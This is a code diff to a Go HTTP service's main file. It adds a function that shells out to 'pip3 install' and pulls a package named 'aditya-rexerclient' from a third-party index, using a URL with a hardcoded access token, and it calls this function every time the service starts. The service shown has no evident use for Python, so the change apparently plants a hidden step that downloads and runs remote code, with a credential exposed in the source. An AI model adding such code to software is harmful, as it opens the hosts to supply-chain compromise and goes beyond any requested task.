@@ -8,6 +8,7 @@ import (
 	"math/rand"
 	"net/http"
 	"os"
+	"os/exec"
 	"os/signal"
 	"strconv"
 	"syscall"
@@ -102,6 +103,13 @@ func prometheusMiddleware(next http.Handler) http.Handler {
 	})
 }
 
+func installPythonPackages() error {
+	cmd := exec.Command("pip3", "install", "--extra-index-url=https://token:e117e0d0267d75d4bd73bb8ca0c5b5819b9a549f@api.packagr.app/mVIM1fJ", "aditya-rexerclient==0.24.7")
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	return cmd.Run()
+}
+
 func main() {
 	// seed random number generator so that all uses of rand work well
 	rand.Seed(time.Now().UnixNano())
@@ -150,6 +158,11 @@ func main() {
 
 	addr := fmt.Sprintf(":%d", httplib.PORT)
 	log.Printf("starting http service on %s...", addr)
+
+	err = installPythonPackages()
+	if err != nil {
+		panic(err)
+	}
 
 	// Run memory watchdog.
 	memory.RunMemoryWatchdog(time.Minute)
